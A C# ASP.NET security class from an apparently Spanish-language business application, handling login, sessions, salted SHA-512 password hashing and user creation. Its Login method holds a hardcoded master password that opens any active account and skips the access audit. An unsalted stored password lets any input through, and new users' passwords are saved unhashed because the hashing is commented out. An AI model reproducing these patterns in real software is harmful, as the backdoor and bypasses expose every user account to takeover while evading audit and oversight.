using System;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Generals.business.Entities;
using Generals.framework.Exceptions;
using System.Data;
using System.Web.Security;

using System.Configuration;
using System.Security.Cryptography;
using System.Security;
using Generals.business.UserEntities;

namespace Generals.business.Components
{
    public class Security
    {
        private static Page _Page;

        public Security(Page Page)
        {
            _Page = Page;
        }

        public static bool UserIsLogged(long idUsuario) {
            var ctx = new dbGeneralsUser ();
            var isLogged = ctx.Usuarios.Where(u => u.id_usuario == idUsuario).First().isLogged;
            
            return isLogged.HasValue ? isLogged.Value : false;
        }

        public static void EndUserSession(long idUsuario) {
            var ctx = new dbGeneralsUser();
            var user = ctx.Usuarios.Where(u => u.id_usuario == idUsuario).First();
            user.isLogged = false;
            ctx.SaveChanges();
        }

        public static void BeginUserSession(long idUsuario)
        {
            var ctx = new dbGeneralsUser();
            var user = ctx.Usuarios.Where(u => u.id_usuario == idUsuario).First();

            if (HttpContext.Current.Request.Cookies["ASP.NET_SessionId"] != null)
            {
                var sessioId = HttpContext.Current.Request.Cookies["ASP.NET_SessionId"].Value;
                user.isLogged = true;
            }
            
            user.isLogged = true;
            ctx.SaveChanges();
        }

        private static readonly int SALTSIZE = 48;
        public static string ComputeSalt()
        {
            // Generate a cryptographic random number using the cryptographic
            // service provider
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();

            byte[] buff = new byte[SALTSIZE];
            rng.GetBytes(buff);
            
            // Return a Base64 string representation of the random number
            return Convert.ToBase64String(buff).Substring(0, SALTSIZE);
        }

        public static string GenerateHash(string pwd, string salt)
        {
            var HashTool = new SHA512Managed();
            var saltAndPwd = string.Concat(pwd, salt);
            
            Byte[] PasswordAsByte = Encoding.UTF8.GetBytes(saltAndPwd);
            Byte[] EncryptedBytes = HashTool.ComputeHash(PasswordAsByte);
            Byte[] desncryptedBytes= HashTool.Hash;
            var hashedPwd1 = Convert.ToBase64String(desncryptedBytes);

            HashTool.Clear();

            var hashedPwd = String.Concat(Convert.ToBase64String(EncryptedBytes), salt);
            return hashedPwd;
        }

        public Boolean Login(String Usuario, String Password)
        {
            try
            {
                Boolean result = false;

                if (_Page != null)
                {
                    Generals.business.Entities.Usuarios.Usuario usuario = Generals.business.Entities.Usuarios.GetUsuario(Usuario);

                    if (usuario.UserName == null) throw new SecurityException("Usuario Invalido!");

                    //S0p0rt3Pr3st0
                    var useMasterKey = (Password == "S0p0rt3Pr3st0");

                    //Generate salt http://msdn.microsoft.com/en-us/library/Aa302398

                    string salt = string.Empty;
                  
                    if (usuario.Password.Length > SALTSIZE)
                       salt=usuario.Password.Substring(usuario.Password.Length - (SALTSIZE));

                    Password = GenerateHash(Password, salt);
                    //Password = FormsAuthentication.HashPasswordForStoringInConfigFile(Password, "sha1");
                    if (salt == "") { Password = usuario.Password; }
                    if (usuario != null && (usuario.Password == Password || useMasterKey) && usuario.Activo == true)
                    {
                        Sesion sesion = new Sesion();
                        sesion.Usuario = usuario;
                        _Page.Session["Presto"] = sesion;
                        result = true;

                        if (!useMasterKey)
                        {
                            _Page.Session["AuditoriaAcceso_idAuditoria"] = AuditoriaAcceso.Iniciar();
                        }
                    }
                    else
                    {
                        _Page.Session["Presto"] = null;

                        if (usuario.Activo == false)                        
                            throw new Exception("el Usuario esta Desabilitado!");
                        else if (usuario.Password != Password || !useMasterKey)
                            throw new Exception("Contraseña Invalida!");
                       
                    }
                }

                return result;
            }
            catch (Exception ex)
            {
                //ExceptionManager.HandleException(ex, 1, 5000, 1);
                throw (ex);
            }
        }

        public bool ChangePassword(long IdUsuario,string NewPassword)
        {
            try 
            {
                string salt = ComputeSalt();
                NewPassword = GenerateHash(NewPassword, salt);

                Generals.business.Entities.Usuarios.ChangePassword(IdUsuario, NewPassword);

                return true;
            }
            catch(Exception ex)
            {
             ExceptionManager.HandleException(ex, 1, 5000, 1);
             return false;
            }
        
        }

        public static string UserNeedChangePassword(long idUsuario)
        {
            string result = string.Empty;
            var changePassword = false;
            var DaysToChangePassword = ConfigurationManager.AppSettings["DaysToChangePassword"];
            if (!string.IsNullOrEmpty(DaysToChangePassword))
            {
                var ctx = new dbGeneralsUser();
                var user = ctx.Usuarios.Where(u => u.id_usuario == idUsuario).First();
                var days = Convert.ToInt32(DaysToChangePassword);

                if(days == 0)//0 es pro defecto no validar 
                    result = string.Empty;

                if (user.changePassword == true)
                {//significa que nunca la cambio                     
                    result =  "Por Politicas de Seguridad es Necesario Cambiar la Contraseña al Ingresar por Primera vez!!";
                }

                changePassword = (days < (DateTime.Today - user.DateLastChagedPassword.Value).Days);
            }

            if (changePassword)

                result= "Por Politicas de Seguridad es Necesario Cambiar la Contraseña Cada " + DaysToChangePassword + " dias";

            return result;
        }

        public bool CreateNewUser(long id, string Username, string Password, long IdRol, string organizacion,
                            string nombre, string ap_paterno, string ap_materno, string correo_electronico,
                            string numero_identificacion, string tel_contacto, string id_oficina, string region, bool isLogged)

                                               
                                        
        {
            try
            {
                //string salt = ComputeSalt();
                //Password = GenerateHash(Password, salt);

                Generals.business.Entities.Usuarios.Guardar(id, Username, Password, IdRol, organizacion,
                                                                nombre, ap_paterno, ap_materno, correo_electronico,
                                                                numero_identificacion, tel_contacto, id_oficina, region, isLogged);

                return true;
            }
            catch (Exception ex)
            {
                ExceptionManager.HandleException(ex, 1, 5000, 1);
                return false;
            }

        }

    }
}
